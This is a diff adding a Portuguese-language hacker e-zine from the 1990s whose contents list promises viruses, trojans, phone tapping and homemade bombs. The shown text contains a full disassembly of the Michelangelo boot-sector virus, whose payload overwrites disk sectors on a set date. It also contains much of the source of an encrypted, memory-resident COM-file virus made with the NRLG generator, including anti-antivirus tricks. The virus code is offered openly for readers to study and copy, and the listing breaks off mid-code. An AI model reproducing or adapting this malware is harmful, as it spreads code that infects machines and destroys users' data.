@@ -1,0 +1,1967 @@
+
+
+                                                            ²²²²²²²²²²²²²²
+                                                                  ²²
+                                                ²²²²²²²²²         ²²
+      ±±±±±±±±±±±     ±±          ±±±±±±±±±±  ±±         ±        ±±
+     ²²         ²²    ²²          ²²          ²²          ²       ²²
+    °°           °°   °°          °°          °°°°°°°°°°°°        °°
+    ²²           ²²   ²²          ²²          ²²²²²               ²²
+    ±±           ±±   ±±          ±±±±±±±±    ±±  ±±              ±±
+    ²²²²²²²²²²²²²²²   ²²          ²²          ²²   ²²             ²²
+    °°           °°   °°          °°          °°    °°            °°
+    ²²           ²²   ²²²²²²²²²²  ²²²²²²²²²²  ²²     ²²           ²²
+                                                                  ²²
+ ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
+
+
+
+       H’½k & çhr‰„k       ZinE
+
+              áæ: Å Fæná0í Å
+
+
+===============================================================================
+ BoM..Aqui estou eu denovo!!eheh escrevendo o segundo numero do AlErt. Como ja
+ disse anteriormente esse zine ‚  mais tecnico, ou seja, eu vou "tentar"
+ explicar como fazer a arte hacking fluir!! eheh... ‚h muito PhoDa escrever um
+ ZINE, pela "falta" de materia, pela falta de "apoio"..a hlera reclama, reclama
+ e reclama mais gosta de ler um bOm zine, onde existem informacoes novas etc.
+ mais soh que, vamos supor, 100000 de pessoas usam computadores no BRASIL,
+ 70000 dessas 100000 pessoas nao sabem o que ‚ hacker, cracker etc...
+ e 29000 pessoas sao lamers, beginners, ETC...ou seja, sobram 1000 pessoas
+ que tem um conhecimento rasoavel... entao que qui adianta eu escrever mate-
+ rias avancadas c soh 1000 pessoas vao saber do que eu estou falando??
+ pensem........ FuCk USA!!!
+
+ Obs.: TENTE, INVENTE, HACKEIE DIFERENTE.
+
+Para algumas belas. E para todas as feras!!! ( bah!! falei bonito!!hehe:)=
+
+===============================================================================
+
+
+  INDICE:
+
+  1- Virus
+     |_____List do virus Michelangello
+        |______ASM de um virus feito em [NuKe]
+
+  2- Hacking 
+     |______Protocolo de TCP/IP
+        
+  3- Trojans e seus "amigos"
+     |_____ O que sao???
+        |_____Trojan em C
+
+  4- Phreaking 
+      |____ Escuta
+
+  5- IRC
+     |____ O que ‚??
+        |___ O que fazer em IRC, bla bla bla!!
+
+  6- Cracking
+     |_____ Como usar o craker Jack
+
+  7- Anarchy 
+     |_____ "MiNa" CaSeIra!!
+        |____ BoMbAz, BoMbAz, BoMbAz!!!
+
+  8- NEWS Hacker 
+        |_______ Ahh sei lah!!! olha la!! eheheh
+
+  9- Agradecimentos!!
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+                        1- VIRUS
+
+
+Bah!! Como eu disse no primeiro zine!! aqui vai o LST do virus Michelangello.
+e tb vou por um ASM de um virus connhecido ae!! :-)
+bah!! vou por as informacoes gerais do virus como no primeiro!!
+
+SOBRE O VIRUS: Michelangello
+
+Este virus do setor de inicializacao possui 512 bytes.
+Infecta o setor de inicializacao de discos flexiveis e a tabela de particoes
+de discos rigidos
+Permanece residente na memoria :)- hehe
+Os efeitos colaterais incluem danificar a ligacao  entre arquivos, alteracao
+no funcionamento do sistema, e alteracoes  no setor de inicializacao.
+
+
+<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+      michelan.lst    listagem do virus mechelangelo	 Sourcer Listing v1.70        8-May-93	 12:51 pm       Page 1
+
+  
+				PAGE  60,132
+  
+				;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
+				;ÛÛ								         ÛÛ
+				;ÛÛ			        MICHELAN			         ÛÛ
+				;ÛÛ								         ÛÛ
+				;ÛÛ      Created:   8-May-93					         ÛÛ
+				;ÛÛ								         ÛÛ
+				;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
+  
+				.286c
+  
+     = 004C			DATA_1E		EQU	4CH				; (0000:004C=94CH)
+     = 004E			DATA_2E		EQU	4EH				; (0000:004E=2427H)
+     = 0413			DATA_3E		EQU	413H				; (0000:0413=280H)
+     = 7C05			DATA_4E		EQU	7C05H				; (0000:7C05=7259H)
+     = 7C0A			DATA_5E		EQU	7C0AH				; (0000:7C0A=5BAH)
+     = 7C0C			DATA_6E		EQU	7C0CH				; (0000:7C0C=4942H)
+     = 0007			DATA_7E		EQU	7				; (8595:0007=0)
+     = 0008			DATA_8E		EQU	8				; (8595:0008=0)
+     = 000A			DATA_9E		EQU	0AH				; (8595:000A=0)
+     = 7C03			DATA_12E	EQU	7C03H				; (8595:7C03=0)
+  
+				CODESEG		SEGMENT
+						ASSUME	CS:CODESEG, DS:CODESEG
+  
+  
+						ORG	100h
+  
+				michelan	PROC	FAR
+  
+8595:0100			start:
+8595:0100  E9 00AC				JMP	LOC_6
+8595:0103  F5 00 40 9F 02 03			DB	0F5H, 0, 40H, 9FH, 2, 3
+8595:0109  00 59 EC 00 F0 1E			DB	0, 59H, 0ECH, 0, 0F0H, 1EH
+8595:010F  50 0A D2 75 1B 33			DB	50H, 0AH, 0D2H, 75H, 1BH, 33H
+8595:0115  C0 8E D8 F6 06 3F			DB	0C0H, 8EH, 0D8H, 0F6H, 6, 3FH
+8595:011B  04 01 75 10 58 1F			DB	4, 1, 75H, 10H, 58H, 1FH
+8595:0121  9C 2E FF 1E 0A 00			DB	9CH, 2EH, 0FFH, 1EH, 0AH, 0
+8595:0127  9C E8 0B 00 9D CA			DB	9CH, 0E8H, 0BH, 0, 9DH, 0CAH
+8595:012D  02 00 58 1F 2E FF			DB	2, 0, 58H, 1FH, 2EH, 0FFH
+8595:0133  2E 0A 00 50 53 51			DB	2EH, 0AH, 0, 50H, 53H, 51H
+8595:0139  52 1E 06 56 57 0E			DB	52H, 1EH, 6, 56H, 57H, 0EH
+8595:013F  1F 0E 07 BE 04 00			DB	1FH, 0EH, 7, 0BEH, 4, 0
+8595:0145			LOC_1:							;  xref 8595:015F
+8595:0145  B8 0201				MOV	AX,201H
+8595:0148  BB 0200				MOV	BX,200H
+8595:014B  B9 0001				MOV	CX,1
+8595:014E  33 D2				XOR	DX,DX				; Zero register
+8595:0150  9C					PUSHF					; Push flags
+8595:0151  FF 1E 000A				CALL	DWORD PTR DS:DATA_9E		; (8595:000A=0)
+8595:0155  73 0C				JNC	LOC_2				; Jump if carry=0
+8595:0157  33 C0				XOR	AX,AX				; Zero register
+8595:0159  9C					PUSHF					; Push flags
+8595:015A  FF 1E 000A				CALL	DWORD PTR DS:DATA_9E		; (8595:000A=0)
+8595:015E  4E					DEC	SI
+8595:015F  75 E4				JNZ	LOC_1				; Jump if not zero
+     michelan.lst    listagem do virus mechelangelo	 Sourcer Listing v1.70        8-May-93	 12:51 pm       Page 2
+
+8595:0161  EB 43				JMP	SHORT LOC_5
+8595:0163			LOC_2:							;  xref 8595:0155
+8595:0163  33 F6				XOR	SI,SI				; Zero register
+8595:0165  FC					CLD					; Clear direction
+8595:0166  AD					LODSW					; String [si] to ax
+8595:0167  3B 07				CMP	AX,[BX]
+8595:0169  75 06				JNE	LOC_3				; Jump if not equal
+8595:016B  AD					LODSW					; String [si] to ax
+8595:016C  3B 47 02				CMP	AX,[BX+2]
+8595:016F  74 35				JE	LOC_5				; Jump if equal
+8595:0171			LOC_3:							;  xref 8595:0169
+8595:0171  B8 0301				MOV	AX,301H
+8595:0174  B6 01				MOV	DH,1
+8595:0176  B1 03				MOV	CL,3
+8595:0178  80 7F 15 FD				CMP	BYTE PTR [BX+15H],0FDH
+8595:017C  74 02				JE	LOC_4				; Jump if equal
+8595:017E  B1 0E				MOV	CL,0EH
+8595:0180			LOC_4:							;  xref 8595:017C
+8595:0180  89 0E 0008				MOV	DS:DATA_8E,CX			; (8595:0008=0)
+8595:0184  9C					PUSHF					; Push flags
+8595:0185  FF 1E 000A				CALL	DWORD PTR DS:DATA_9E		; (8595:000A=0)
+8595:0189  72 1B				JC	LOC_5				; Jump if carry Set
+8595:018B  BE 03BE				MOV	SI,3BEH
+8595:018E  BF 01BE				MOV	DI,1BEH
+8595:0191  B9 0021				MOV	CX,21H
+8595:0194  FC					CLD					; Clear direction
+8595:0195  F3/A5				REP	MOVSW				; Rep while cx>0 Mov [si] to es:[di]
+8595:0197  B8 0301				MOV	AX,301H
+8595:019A  33 DB				XOR	BX,BX				; Zero register
+8595:019C  B9 0001				MOV	CX,1
+8595:019F  33 D2				XOR	DX,DX				; Zero register
+8595:01A1  9C					PUSHF					; Push flags
+8595:01A2  FF 1E 000A				CALL	DWORD PTR DS:DATA_9E		; (8595:000A=0)
+8595:01A6			LOC_5:							;  xref 8595:0161, 016F, 0189
+8595:01A6  5F					POP	DI
+8595:01A7  5E					POP	SI
+8595:01A8  07					POP	ES
+8595:01A9  1F					POP	DS
+8595:01AA  5A					POP	DX
+8595:01AB  59					POP	CX
+8595:01AC  5B					POP	BX
+8595:01AD  58					POP	AX
+8595:01AE  C3					RET
+8595:01AF			LOC_6:							;  xref 8595:0100
+8595:01AF  33 C0				XOR	AX,AX				; Zero register
+8595:01B1  8E D8				MOV	DS,AX
+8595:01B3  FA					CLI					; Disable interrupts
+8595:01B4  8E D0				MOV	SS,AX
+8595:01B6  B8 7C00				MOV	AX,7C00H
+8595:01B9  8B E0				MOV	SP,AX
+8595:01BB  FB					STI					; Enable interrupts
+8595:01BC  1E					PUSH	DS
+8595:01BD  50					PUSH	AX
+8595:01BE  A1 004C				MOV	AX,DS:DATA_1E			; (0000:004C=94CH)
+8595:01C1  A3 7C0A				MOV	DS:DATA_5E,AX			; (0000:7C0A=5BAH)
+8595:01C4  A1 004E				MOV	AX,DS:DATA_2E			; (0000:004E=2427H)
+8595:01C7  A3 7C0C				MOV	DS:DATA_6E,AX			; (0000:7C0C=4942H)
+8595:01CA  A1 0413				MOV	AX,DS:DATA_3E			; (0000:0413=280H)
+     michelan.lst    listagem do virus mechelangelo	 Sourcer Listing v1.70        8-May-93	 12:51 pm       Page 3
+
+8595:01CD  48					DEC	AX
+8595:01CE  48					DEC	AX
+8595:01CF  A3 0413				MOV	DS:DATA_3E,AX			; (0000:0413=280H)
+8595:01D2  B1 06				MOV	CL,6
+8595:01D4  D3 E0				SHL	AX,CL				; Shift w/zeros fill
+8595:01D6  8E C0				MOV	ES,AX
+8595:01D8  A3 7C05				MOV	DS:DATA_4E,AX			; (0000:7C05=7259H)
+8595:01DB  B8 000E				MOV	AX,0EH
+8595:01DE  A3 004C				MOV	DS:DATA_1E,AX			; (0000:004C=94CH)
+8595:01E1  8C 06 004E				MOV	DS:DATA_2E,ES			; (0000:004E=2427H)
+8595:01E5  B9 01BE				MOV	CX,1BEH
+8595:01E8  BE 7C00				MOV	SI,7C00H
+8595:01EB  33 FF				XOR	DI,DI				; Zero register
+8595:01ED  FC					CLD					; Clear direction
+8595:01EE  F3/A4				REP	MOVSB				; Rep while cx>0 Mov [si] to es:[di]
+8595:01F0  2E:FF 2E 7C03			JMP	DWORD PTR CS:DATA_12E		; (8595:7C03=0)
+8595:01F5  33 C0 8E C0 CD 13			DB	33H, 0C0H, 8EH, 0C0H, 0CDH, 13H
+8595:01FB  0E 1F B8 01 02 BB			DB	0EH, 1FH, 0B8H, 1, 2, 0BBH
+8595:0201  00 7C 8B 0E 08 00			DB	0, 7CH, 8BH, 0EH, 8, 0
+8595:0207  83 F9 07 75 07 BA			DB	83H, 0F9H, 7, 75H, 7, 0BAH
+8595:020D  80 00 CD 13 EB 2B			DB	80H, 0, 0CDH, 13H, 0EBH, 2BH
+8595:0213  8B 0E 08 00 BA 00			DB	8BH, 0EH, 8, 0, 0BAH, 0
+8595:0219  01 CD 13 72 20 0E			DB	1, 0CDH, 13H, 72H, 20H, 0EH
+8595:021F  07 B8 01 02 BB 00			DB	7, 0B8H, 1, 2, 0BBH, 0
+8595:0225  02 B9 01 00 BA 80			DB	2, 0B9H, 1, 0, 0BAH, 80H
+8595:022B  00 CD 13 72 0E 33			DB	0, 0CDH, 13H, 72H, 0EH, 33H
+8595:0231  F6 FC AD 3B 07 75			DB	0F6H, 0FCH, 0ADH, 3BH, 7, 75H
+8595:0237  4F AD 3B 47 02			DB	4FH, 0ADH, 3BH, 47H, 2
+8595:023C  75 49				DB	75H, 49H
+8595:023E			LOC_7:							;  xref 8595:0296
+8595:023E  33 C9				XOR	CX,CX				; Zero register
+8595:0240  B4 04				MOV	AH,4
+8595:0242  CD 1A				INT	1AH				; Real time clock   ah=func 04h
+											;  read date cx=year, dx=mon/day
+8595:0244  81 FA 0306				CMP	DX,306H
+8595:0248  74 01				JE	LOC_8				; Jump if equal
+8595:024A  CB					RET					; Return far
+8595:024B			LOC_8:							;  xref 8595:0248
+8595:024B  33 D2				XOR	DX,DX				; Zero register
+8595:024D  B9 0001				MOV	CX,1
+8595:0250			LOC_9:							;  xref 8595:027F, 0285
+8595:0250  B8 0309				MOV	AX,309H
+8595:0253  8B 36 0008				MOV	SI,DS:DATA_8E			; (8595:0008=0)
+8595:0257  83 FE 03				CMP	SI,3
+8595:025A  74 10				JE	LOC_10				; Jump if equal
+8595:025C  B0 0E				MOV	AL,0EH
+8595:025E  83 FE 0E				CMP	SI,0EH
+8595:0261  74 09				JE	LOC_10				; Jump if equal
+8595:0263  B2 80				MOV	DL,80H
+8595:0265  C6 06 0007 04			MOV	BYTE PTR DS:DATA_7E,4		; (8595:0007=0)
+8595:026A  B0 11				MOV	AL,11H
+8595:026C			LOC_10:							;  xref 8595:025A, 0261
+8595:026C  BB 5000				MOV	BX,5000H
+8595:026F  8E C3				MOV	ES,BX
+8595:0271  CD 13				INT	13H				; Disk  dl=drive a: ah=func 03h
+											;  write sectors from mem es:bx
+8595:0273  73 04				JNC	LOC_11				; Jump if carry=0
+8595:0275  32 E4				XOR	AH,AH				; Zero register
+     michelan.lst    listagem do virus mechelangelo	 Sourcer Listing v1.70        8-May-93	 12:51 pm       Page 4
+
+8595:0277  CD 13				INT	13H				; Disk  dl=drive a: ah=func 00h
+											;  reset disk, al=return status
+8595:0279			LOC_11:							;  xref 8595:0273
+8595:0279  FE C6				INC	DH
+8595:027B  3A 36 0007				CMP	DH,DS:DATA_7E			; (8595:0007=0)
+8595:027F  72 CF				JB	LOC_9				; Jump if below
+8595:0281  32 F6				XOR	DH,DH				; Zero register
+8595:0283  FE C5				INC	CH
+8595:0285  EB C9				JMP	SHORT LOC_9
+8595:0287			LOC_12:
+8595:0287  B9 0007				MOV	CX,7
+8595:028A  89 0E 0008				MOV	DS:DATA_8E,CX			; (8595:0008=0)
+8595:028E  B8 0301				MOV	AX,301H
+8595:0291  BA 0080				MOV	DX,80H
+8595:0294  CD 13				INT	13H				; Disk  dl=drive a: ah=func 03h
+											;  write sectors from mem es:bx
+8595:0296  72 A6				JC	LOC_7				; Jump if carry Set
+8595:0298  BE 03BE				MOV	SI,3BEH
+8595:029B  BF 01BE				MOV	DI,1BEH
+8595:029E  B9 0021				MOV	CX,21H
+8595:02A1  F3/A5				REP	MOVSW				; Rep while cx>0 Mov [si] to es:[di]
+8595:02A3  B8 0301				MOV	AX,301H
+8595:02A6  33 DB				XOR	BX,BX				; Zero register
+8595:02A8  FE C1				INC	CL
+8595:02AA  CD 13				INT	13H				; Disk  dl=drive a: ah=func 03h
+											;  write sectors from mem es:bx
+8595:02AC  EB 04				JMP	SHORT LOC_13
+8595:02AE  32 01				DB	32H, 1
+8595:02B0  000E[00]				DB	14 DUP (0)
+8595:02BE  49 42 4D 42 49 4F			DB	'IBMBIO  COMIBMDOS  COM'
+8595:02C4  20 20 43 4F 4D 49
+8595:02CA  42 4D 44 4F 53 20
+8595:02D0  20 43 4F 4D
+8595:02D4  0028[00]				DB	40 DUP (0)
+8595:02FC  57 13 55 AA				DB	57H, 13H, 55H, 0AAH
+  
+				michelan	ENDP
+  
+				CODESEG		ENDS
+  
+  
+  
+						END	START
+
+
+<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+
+ Para quem gosta de virus aqui vai um ASM de um virus feito pelo NRLG [NUKE].
+
+ Nota: Esse virii qquer Anti-Virus detecta...( intaum compilar ele, seria pura
+ perda de tempo ) Intaum p/ quem gosta de virii ou ASSEMBLY da um l00k no
+ source e tenta faze algo parecido!! ou ate quem sabe fazer um proGz tipo o
+ NRLG que cria um .ASM e tb compilar. bah!!
+__________________________________________________\/____________________________
+
+;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+;³ THiS iS a [NuKE] RaNDoMiC LiFe GeNeRaToR ViRuS.        ³ [NuKE] PoWeR
+;³ CReaTeD iS a N.R.L.G. PRoGRaM V0.66 BeTa TeST VeRSioN  ³ [NuKE] WaReZ
+;³ auToR: aLL [NuKE] MeMeBeRS                             ³ [NuKE] PoWeR
+;³ [NuKE] THe ReaL PoWeR!                                 ³ [NuKE] WaReZ
+;³ NRLG WRiTTeR: AZRAEL (C) [NuKE] 1994                   ³ [NuKE] PoWeR
+;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+.286
+code    segment
+assume cs:code,ds:code
+org  100h
+
+start:  CALL NEXT 
+ 
+NEXT:  
+       mov di,sp             ;take the stack pointer location 
+       mov bp,ss:[di]        ;take the "DELTA HANDLE" for my virus       
+       sub bp,offset next    ;subtract the large code off this code 
+                             ;
+;*******************************************************************
+;                      #1 DECRYPT ROUTINE                               
+;*******************************************************************
+
+cmp byte ptr cs:[crypt],0b9h ;is the first runnig?        
+je crypt2                    ;yes! not decrypt              
+;----------------------------------------------------------                                          
+mov cx,offset fin            ;cx = large of virus               
+lea di,[offset crypt]+ bp    ;di = first byte to decrypt          
+mov dx,1                     ;dx = value for decrypt          
+;----------------------------------------------------------                                                   
+deci:                        ;deci = fuck label!                                    
+;----------------------------------------------------------
+
+ÿadd byte ptr [di],0fh
+inc byte ptr [di]
+add byte ptr [di],0cdh
+sub word ptr [di],0cb9bh
+inc byte ptr [di]
+add word ptr [di],0163bh
+add word ptr [di],02ca9h
+add word ptr [di],03877h
+sub word ptr [di],079ach
+not byte ptr [di] 
+add word ptr [di],0fbf3h
+inc byte ptr [di]
+inc word ptr [di]
+add word ptr [di],0cd9h
+inc byte ptr [di]
+add word ptr [di],0bd67h
+sub word ptr [di],03df2h
+ÿinc di
+inc di
+;----------------------------------------------------------                                                
+jmp bye                      ;######## BYE BYE F-PROT ! ##########     
+mov ah,4ch
+int 21h
+bye:                         ;#### HEY FRIDRIK! IS ONLY A JMP!!###      
+;-----------------------------------------------------------                               
+mov ah,0bh                   ;######### BYE BYE TBAV ! ##########     
+int 21h                      ;### (CANGE INT AT YOU PLEASURE) ###        
+;----------------------------------------------------------                                   
+loop deci                    ;repeat please!               
+                             ;           
+;*****************************************************************
+;                   #2 DECRYPT ROUTINE                                                    
+;*****************************************************************
+                              ;    
+crypt:                        ;fuck label!                  
+                              ;                
+mov cx,offset fin             ;cx = large of virus                 
+lea di,[offset crypt2] + bp   ;di = first byte to decrypt                  
+;---------------------------------------------------------------                                              
+deci2:                        ;              
+xor byte ptr cs:[di],1        ;decrytion rutine          
+inc di                        ;very simple...            
+loop deci2                    ;           
+;---------------------------------------------------------------
+crypt2:                       ;fuck label!          
+                              ;                  
+MOV AX,0CACAH                 ;call to my resident interrup mask                  
+INT 21H                       ;for chek "I'm is residet?"   
+CMP Bh,0CAH                   ;is equal to CACA?
+JE PUM2                       ;yes! jump to runnig program
+call action
+;*****************************************************************
+; NRLG FUNCTIONS  (SELECTABLE)
+;*****************************************************************
+
+ÿcall MBR
+call TRASH_RN
+call ANTI_V
+;****************************************************************
+;               PROCESS TO REMAIN RESIDENT                                                                  
+;****************************************************************   
+
+mov   ax,3521h                  
+int   21h                        ;store the int 21 vectors 
+mov   word ptr [bp+int21],bx     ;in cs:int21
+mov   word ptr [bp+int21+2],es   ;
+;---------------------------------------------------------------
+push cs                          ; 
+pop ax                           ;ax = my actual segment                             
+dec ax                           ;dec my segment for look my MCB
+mov es,ax                        ;
+mov bx,es:[3]                    ;read the #3 byte of my MCB =total used memory
+;---------------------------------------------------------------
+push cs                          ;   
+pop es                           ;   
+sub bx,(offset fin - offset start + 15)/16  ;subtract the large of my virus 
+sub bx,17 + offset fin           ;and 100H for the PSP total
+mov ah,4ah                       ;used memory
+int 21h                          ;put the new value to MCB
+;---------------------------------------------------------------
+mov bx,(offset fin - offset start + 15)/16 + 16 + offset fin     
+mov ah,48h                      ;                              
+int 21h                         ;request the memory to fuck DOS!                                                 
+;---------------------------------------------------------------
+dec ax                          ;ax=new segment 
+mov es,ax                       ;ax-1= new segment MCB 
+mov byte ptr es:[1],8           ;put '8' in the segment
+;--------------------------------------------------------------                                
+inc ax                          ; 
+mov es,ax                       ;es = new segment
+lea si,[bp + offset start]      ;si = start of virus 
+mov di,100h                     ;di = 100H (psp position) 
+mov cx,offset fin - start       ;cx = lag of virus
+push cs                         ;
+pop ds                          ;ds = cs
+cld                             ;mov the code
+rep movsb                       ;ds:si >> es:di
+;--------------------------------------------------------------
+mov dx,offset virus             ;dx = new int21 handler
+mov ax,2521h                    ;
+push es                         ; 
+pop ds                          ; 
+int 21h                         ;set the vectors 
+;-------------------------------------------------------------
+pum2:                               ;  
+                                    ; 
+mov ah,byte ptr [cs:bp + real]      ;restore the 3  
+mov byte ptr cs:[100h],ah           ;first bytes  
+mov ax,word ptr [cs:bp + real + 1]  ;
+mov word ptr cs:[101h],ax           ;
+;-------------------------------------------------------------
+mov ax,100h                         ;
+jmp ax                              ;jmp to execute
+                                    ;
+;*****************************************************************
+;*             HANDLER FOR THE INT 21H                                       
+;*****************************************************************
+                          ;          
+VIRUS:                    ;  
+                          ;     
+cmp ah,4bh                ;is a 4b function? 
+je REPRODUCCION           ;yes! jump to reproduce !
+cmp ah,11h
+je dir
+cmp ah,12h
+je dir
+dirsal:
+cmp AX,0CACAH             ;is ... a caca function? (resident chek)
+jne a3                    ;no! jump to a3
+mov bh,0cah               ;yes! put ca in bh
+a3:                       ;
+JMP dword ptr CS:[INT21]  ;jmp to original int 21h
+ret                       ;    
+make db '[NuKE] N.R.L.G. AZRAEL'
+dir:
+jmp dir_s
+;-------------------------------------------------------------
+REPRODUCCION:              ;       
+                           ;
+pushf                      ;put the register
+pusha                      ;in the stack
+push si                    ;
+push di                    ;
+push bp                    ;
+push es                    ;
+push ds                    ;
+;-------------------------------------------------------------
+push cs                    ;  
+pop ds                     ;  
+mov ax,3524H               ;get the dos error control                      
+int 21h                    ;interupt                        
+mov word ptr error,es      ;and put in cs:error                      
+mov word ptr error+2,bx    ;            
+mov ax,2524H               ;change the dos error control                    
+mov dx,offset all          ;for my "trap mask"                      
+int 21h                    ;         
+;-------------------------------------------------------------
+pop ds                     ;
+pop es                     ;restore the registers
+pop bp                     ;
+pop di                     ;
+pop si                     ;
+popa                       ;
+popf                       ;
+;-------------------------------------------------------------
+pushf                      ;put the registers
+pusha                      ;     
+push si                    ;HEY! AZRAEL IS CRAZY?
+push di                    ;PUSH, POP, PUSH, POP
+push bp                    ;PLEEEEEAAAAAASEEEEEEEEE
+push es                    ;PURIFY THIS SHIT!
+push ds                    ;
+;-------------------------------------------------------------
+mov ax,4300h                 ;       
+int 21h                      ;get the file     
+mov word ptr cs:[attrib],cx  ;atributes   
+;-------------------------------------------------------------
+mov ax,4301h                 ;le saco los atributos al        
+xor cx,cx                    ;file 
+int 21h                      ;
+;-------------------------------------------------------------  
+mov ax,3d02h                 ;open the file 
+int 21h                      ;for read/write
+mov bx,ax                    ;bx=handle
+;-------------------------------------------------------------
+mov ax,5700h                ;     
+int 21h                     ;get the file date  
+mov word ptr cs:[hora],cx   ;put the hour    
+mov word ptr cs:[dia],dx    ;put the day    
+and cx,word ptr cs:[fecha]  ;calculate the seconds    
+cmp cx,word ptr cs:[fecha]  ;is ecual to 58? (DEDICATE TO N-POX)    
+jne seguir                  ;yes! the file is infected!     
+jmp cerrar                  ;
+;------------------------------------------------------------
+seguir:                     ;     
+mov ax,4202h                ;move the pointer to end
+call movedor                ;of the file
+;------------------------------------------------------------
+push cs                     ;   
+pop ds                      ; 
+sub ax,3                    ;calculate the 
+mov word ptr [cs:largo],ax  ;jmp long
+;-------------------------------------------------------------
+mov ax,04200h               ;move the pointer to  
+call movedor                ;start of file
+;----------------------------------------------------------                                          
+push cs                     ;   
+pop ds                      ;read the 3 first bytes  
+mov ah,3fh                  ;                           
+mov cx,3                    ;
+lea dx,[cs:real]            ;put the bytes in cs:[real]
+int 21h                     ;
+;----------------------------------------------------------                                          
+cmp word ptr cs:[real],05a4dh   ;the 2 first bytes = 'MZ' ?
+jne er1                         ;yes! is a EXE... fuckkk!
+;----------------------------------------------------------
+jmp cerrar
+er1:
+;----------------------------------------------------------                                          
+mov ax,4200h      ;move the pointer                               
+call movedor      ;to start fo file
+;----------------------------------------------------------                                          
+push cs           ;       
+pop ds            ; 
+mov ah,40h        ;  
+mov cx,1          ;write the JMP
+lea dx,[cs:jump]  ;instruccion in the
+int 21h           ;fist byte of the file
+;----------------------------------------------------------                                          
+mov ah,40h         ;write the value of jmp
+mov cx,2           ;in the file 
+lea dx,[cs:largo]  ; 
+int 21h            ;
+;----------------------------------------------------------                                          
+mov ax,04202h      ;move the pointer to 
+call movedor       ;end of file
+;----------------------------------------------------------                                          
+push cs                     ;        
+pop ds                      ;move the code  
+push cs                     ;of my virus      
+pop es                      ;to cs:end+50     
+cld                         ;for encrypt          
+mov si,100h                 ;    
+mov di,offset fin + 50      ;      
+mov cx,offset fin - 100h    ;        
+rep movsb                   ;      
+;----------------------------------------------------------                                          
+mov cx,offset fin           
+mov di,offset fin + 50 + (offset crypt2 - offset start)  ;virus         
+enc:                              ;           
+xor byte ptr cs:[di],1            ;encrypt the virus              
+inc di                            ;code                   
+loop enc                          ;              
+;---------------------------------------------------------
+mov cx,offset fin           
+mov di,offset fin + 50 + (offset crypt - offset start)  ;virus         
+mov dx,1
+enc2:                              ;           
+
+ÿadd word ptr [di],03df2h
+sub word ptr [di],0bd67h
+dec byte ptr [di]
+sub word ptr [di],0cd9h
+dec word ptr [di]
+dec byte ptr [di]
+sub word ptr [di],0fbf3h
+not byte ptr [di]
+add word ptr [di],079ach
+sub word ptr [di],03877h
+sub word ptr [di],02ca9h
+sub word ptr [di],0163bh
+dec byte ptr [di]
+add word ptr [di],0cb9bh
+sub byte ptr [di],0cdh
+dec byte ptr [di]
+sub byte ptr [di],0fh
+ÿinc di
+inc di                             ;the virus code                  
+loop enc2                          ;              
+;--------------------------------------------
+mov ah,40h                       ;  
+mov cx,offset fin - offset start ;copy the virus              
+mov dx,offset fin + 50           ;to end of file
+int 21h                          ;
+;----------------------------------------------------------                                          
+cerrar:                          ;
+                                 ;restore the       
+mov ax,5701h                     ;date and time    
+mov cx,word ptr cs:[hora]        ;file   
+mov dx,word ptr cs:[dia]         ;     
+or cx,word ptr cs:[fecha]        ;and mark the seconds  
+int 21h                          ; 
+;----------------------------------------------------------                                          
+mov ah,3eh                       ; 
+int 21h                          ;close the file
+;----------------------------------------------------------                                          
+pop ds                           ;
+pop es                           ;restore the 
+pop bp                           ;registers
+pop di                           ; 
+pop si                           ;
+popa                             ;
+popf                             ;
+;----------------------------------------------------------                                          
+pusha                           ;   
+                                ;                                                             
+mov ax,4301h                    ;restores the atributes 
+mov cx,word ptr cs:[attrib]     ;of the file  
+int 21h                         ;   
+                                ;
+popa                            ; 
+;----------------------------------------------------------                                          
+pushf                           ;                           
+pusha                           ; 8-(  = f-prot                       
+push si                         ;                       
+push di                         ; 8-(  = tbav   
+push bp                         ;                       
+push es                         ; 8-)  = I'm                        
+push ds                         ;                              
+;----------------------------------------------------------                                          
+mov ax,2524H                    ;                         
+lea bx,error                    ;restore the                         
+mov ds,bx                       ;errors handler      
+lea bx,error+2                  ;                         
+int 21h                         ;                       
+;----------------------------------------------------------                                          
+pop ds                          ;
+pop es                          ;
+pop bp                          ;restore the 
+pop di                          ;resgisters
+pop si                          ;
+popa                            ;
+popf                            ;
+;----------------------------------------------------------                                          
+JMP A3                          ;jmp to orig. INT 21
+                                ;
+;**********************************************************
+;           SUBRUTINES AREA
+;**********************************************************
+                                ;
+movedor:                        ;   
+                                ; 
+xor cx,cx                       ;use to move file pointer         
+xor dx,dx                       ;       
+int 21h                         ;        
+ret                             ;        
+;----------------------------------------------------------                                          
+all:                            ;  
+                                ; 
+XOR AL,AL                       ;use to set 
+iret                            ;error flag
+
+;***********************************************************
+;         DATA AREA
+;***********************************************************
+largo  dw  ?
+jump   db  0e9h
+real   db  0cdh,20h,0
+hora   dw  ?
+dia    dw  ?
+attrib dw  ?
+int21  dd  ?
+error  dd  ?
+
+ÿ;---------------------------------
+action:                          ; 
+MOV AH,2AH                       ;        
+INT 21H                          ;get date           
+CMP Dl,byte ptr cs:[action_dia+bp]  ;is equal to my day?                 
